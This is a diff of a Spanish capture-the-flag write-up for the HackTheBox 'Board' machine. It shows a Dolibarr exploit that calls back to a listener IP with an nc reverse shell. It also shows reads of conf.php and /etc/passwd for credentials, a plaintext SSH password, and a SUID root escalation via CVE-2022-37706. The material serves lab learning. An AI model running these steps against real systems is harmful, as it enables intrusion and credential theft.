@@ -36,5 +36,38 @@ python3 exploit.py http://crm.board.htb admin admin 10.10.14.101 4444
 
 nc -lvnp 4444
 
-En esta etapa, tras obtener la shell en la máquina objetivo, descubrimos que el flag no se encuentra en esta máquina en particular. En cambio, el objetivo ahora es buscar las credenciales del otro usuario en esta misma máquina que indagando por documentaciones de Dolibarr se llama Larissa.
+Revisamos todos los archivos y encontramos la contraseña ssh en el archivo conf.php. Vamos a comprobar el nombre de usuario. 
+
+Vemos que hay un directorio larissa en cd /home/.
+
+cat /etc/passwd | grep bash
+
+cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
+
+Nos conectamos a larissa por ssh con la contrasena encontyrada: serverfun2$2023!!
+
+cat user.txt
+
+SUID exploited using CVE-2022–37706
+
+Utilizamos LinPEAS
+
+Buscamos el código del script en GitHub, lo copiamos y lo pegamos en un nuevo archivo suid.sh en el directorio del usuario Larissa.
+
+nano suid.sh
+
+Para ejecutar el script, necesitamos otorgarle permisos de ejecución
+
+chmod +x suid.sh
+
+Ejecutamos el script 
+
+bash suid.sh & ./exploit.sh
+
+ls
+
+id
+
+cat root.txt
+
 
